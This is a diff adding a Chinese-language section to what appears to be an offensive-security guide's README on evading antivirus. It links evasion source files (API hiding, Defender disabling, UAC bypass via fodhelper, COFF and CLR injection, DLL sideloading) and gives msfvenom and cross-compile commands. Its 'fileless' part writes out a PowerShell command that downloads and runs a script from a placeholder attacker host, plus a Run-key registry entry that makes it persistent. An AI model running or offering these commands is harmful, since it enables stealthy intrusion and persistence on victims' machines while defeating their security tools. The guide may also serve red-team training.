@@ -1004,3 +1004,156 @@ msfvenom -p windows/x64/messagebox TEXT='Hi,I am Xor' TITLE='Ghost Wolf Lab' -f 
 python3 xor.py
 x86_64-w64-mingw32-gcc xor.cpp -o xor.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc >/dev/null 2>&1
 ```
+
+### 函数调用混淆
+
+```bash
+msfvenom -p windows/x64/messagebox TEXT='Hi,I am Hide Function' TITLE='Ghost Wolf Lab' -f csharp
+```
+
+[hide_function.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/hide_function.cpp)
+
+[hide_function.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/hide_function.py)
+
+```bash
+python3 hide_function.py
+x86_64-w64-mingw32-gcc hide_function.cpp -o hide_function.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc >/dev/null 2>&1
+```
+
+### 分配和填充大量内存
+
+[100MB.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/100MB.cpp)
+
+```bash
+x86_64-w64-mingw32-g++ 100MB.cpp -o 100MB.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+```
+
+### 隐藏Windows API调用
+
+[xor_function.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/xor_function.py)
+
+```bash
+python3 xor_function.py
+```
+
+[hide_api.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/hide_api.cpp)
+
+```bash
+i686-w64-mingw32-g++ hide_api.cpp -o hide_api.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -Wint-to-pointer-cast -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+```
+
+### 哈希名称调用函数
+
+[hash.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/hash.py)
+
+[hash_function.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/hash_function.cpp)
+
+```bash
+i686-w64-mingw32-g++ hash_function.cpp -o hash_function.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -Wint-to-pointer-cast -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+```
+
+### 禁用Windows Defender
+
+[defender.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/defender.cpp)
+
+```bash
+x86_64-w64-mingw32-g++ -O2 defender.cpp -o defender.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+```
+
+```bash
+reg query "HKLM\Software\Policies\Microsoft\Windows Defender" /s
+```
+
+### fodhelper.exe绕过UAC
+
+[fodhelper.exe绕过UAC](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/fodhelper.exe绕过UAC.cpp)
+
+```bash
+reg query "HKCU\Software\Classes\ms-settings\Shell\open\command"
+whoami /priv
+```
+
+### 自定义实现GetModuleHandle
+
+[gmh.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/gmh.cpp)
+
+```bash
+x86_64-w64-mingw32-g++ -O2 gmh.cpp -o gmh.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+```
+
+### 自定义实现GetProcAddress
+
+[gpa.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/gpa.cpp)
+
+```bash
+x86_64-w64-mingw32-g++ -O2 gpa.cpp -o gpa.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+```
+
+### COFF注入
+
+[malicious.c](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/malicious.c)
+
+```bash
+clang -c -o malicious.obj malicious.c
+```
+
+[coff.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/coff.cpp)
+
+### .NET运行时托管
+
+[MaliciousAssembly.cs](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/MaliciousAssembly.cs)
+
+```bash
+csc /target:library /out:MaliciousAssembly.dll MaliciousAssembly.cs
+```
+
+[CLRHost.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/CLRHost.cpp)
+
+### 分离
+
+[ModuleA.c](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/ModuleA.c)
+
+```bash
+x86_64-w64-mingw32-gcc -shared -o ModuleA.dll ModuleA.c
+```
+
+[MainProgram.c](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/MainProgram.c)
+
+```bash
+x86_64-w64-mingw32-gcc -o MainProgram.exe MainProgram.c
+```
+
+### 白加黑
+
+[white+black.c](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/white+black.c)
+
+```bash
+x86_64-w64-mingw32-g++ -O2 white+black.c -o wb.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+```
+
+### 远程加载
+
+[download.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/download.cpp)
+
+```bash
+msfvenom -p windows/x64/messagebox TEXT='Hi,I am Snowwolf' TITLE='Ghost Wolf Lab' -f raw -o wolf.bin
+x86_64-w64-mingw32-g++ -O2 download.cpp -o download.exe -mconsole -lwininet -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+```
+
+### 无文件
+
+1. 内存加载恶意代码
+
+```bash
+powershell -ExecutionPolicy Bypass -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('http://攻击者主机地址/malicious.ps1')"
+```
+
+2. 注册表持久化
+
+```bash
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MaliciousScript" /t REG_SZ /d "powershell.exe -ExecutionPolicy Bypass -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://攻击者主机地址/malicious.ps1')\"" /f
+```
+
+3. 进程注入
+
+[进程注入](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/进程注入.cpp)
